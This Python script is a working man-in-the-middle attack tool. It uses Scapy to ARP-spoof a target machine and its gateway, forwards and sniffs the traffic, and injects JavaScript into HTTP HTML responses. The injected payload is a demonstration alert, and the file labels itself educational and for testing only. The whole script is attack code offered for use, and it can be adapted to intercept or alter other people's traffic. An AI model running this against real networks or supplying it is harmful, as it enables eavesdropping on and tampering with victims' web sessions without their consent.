import argparse
from scapy.all import *
from scapy.layers.http import HTTPResponse
import threading
import subprocess
import os
from mac_resolution import resolve_mac  # Importing the MAC resolution utility

# Configuration
GATEWAY_IP = "10.0.1.138"  # Replace with your gateway/router IP
TARGET_IP = "10.0.1.33"  # Replace with the target machine's IP
INJECTION_CODE = '<script>alert("Injected Code: For Educational Purposes Only!");</script>'

# Enable IP forwarding for the attacker's machine
def enable_ip_forwarding(interface):
    try:
        if os.name == "nt":  # Windows
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=enabled"], check=True)
        else:  # Unix/Linux/Mac
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], shell=True, check=True)
        print("IP forwarding enabled successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to enable IP forwarding: {e}")

# Disable IP forwarding
def disable_ip_forwarding(interface):
    try:
        if os.name == "nt":  # Windows
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=disabled"], check=True)
        else:  # Unix/Linux/Mac
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], shell=True, check=True)
        print("IP forwarding disabled successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable IP forwarding: {e}")

# ARP spoofing function
def arp_spoof(target_ip, spoof_ip):
    target_mac = resolve_mac(target_ip)
    if not target_mac:
        print(f"Failed to resolve MAC address for {target_ip}")
        return
    while True:
        # Send ARP reply to target
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=0)
        time.sleep(2)

# Restore ARP table to prevent network issues
def restore_arp(target_ip, gateway_ip):
    target_mac = resolve_mac(target_ip)
    gateway_mac = resolve_mac(gateway_ip)
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=4, verbose=0)

# Packet sniffing and injection
def packet_sniffer(interface):
    sniff(iface=interface, prn=packet_callback, store=0)

# Callback function for sniffed packets
def packet_callback(packet):
    if packet.haslayer(HTTPResponse):
        if b"text/html" in packet[HTTPResponse].Content_Type:
            # Inject JavaScript into HTTP response
            payload = packet[HTTPResponse].payload.load.decode()
            injected_payload = payload.replace("</body>", f"{INJECTION_CODE}</body>")
            packet[HTTPResponse].payload.load = injected_payload.encode()

            # Send the modified packet
            send(packet)

# Main function
def main(interface):
    enable_ip_forwarding(interface)
    try:
        arp_thread = threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP))
        arp_thread.start()

        print("Starting packet sniffer on interface:", interface)
        packet_sniffer(interface)
    except KeyboardInterrupt:
        print("Restoring ARP table...")
        restore_arp(TARGET_IP, GATEWAY_IP)
    finally:
        disable_ip_forwarding(interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Injector for Testing Purposes Only")
    parser.add_argument("interface", help="The network interface to use (e.g., eth0, wlan0, WiFi 2)")
    args = parser.parse_args()

    main(args.interface)
